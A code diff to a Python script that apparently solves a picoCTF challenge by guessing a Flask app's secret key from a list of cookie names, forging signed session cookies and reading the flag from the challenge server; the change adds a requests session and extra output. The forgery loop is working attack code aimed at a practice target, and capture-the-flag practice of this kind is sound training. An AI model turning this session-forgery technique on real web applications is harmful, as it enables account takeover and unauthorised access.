@@ -32,8 +32,9 @@ def encodeFlaskCookie(secret_key, cookieDict):
 	return signingSerializer.dumps(cookieDict)
 
 if __name__=='__main__':
+	s = requests.session()
 	cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
-	r = requests.post('http://mercury.picoctf.net:6259/search')
+	r = s.post('http://mercury.picoctf.net:6259/search', data={'name': 'a'})
 	res = r.headers['Set-Cookie']
 	p = re.compile('session=([a-zA-Z0-9.-]+)')
 	cookie = p.findall(res)[0]
@@ -47,7 +48,8 @@ if __name__=='__main__':
 			print(payload)
 			headers = {'Cookie': 'session=' + payload}
 			print(headers)
-			r = requests.get('http://mercury.picoctf.net:6259/display', headers=headers)
+			r = s.get('http://mercury.picoctf.net:6259/display', headers=headers)
+			print(r.text)
 			p = re.compile('picoCTF\{.*\}')
 			flag = p.findall(r.text)[0]
 			print(flag)
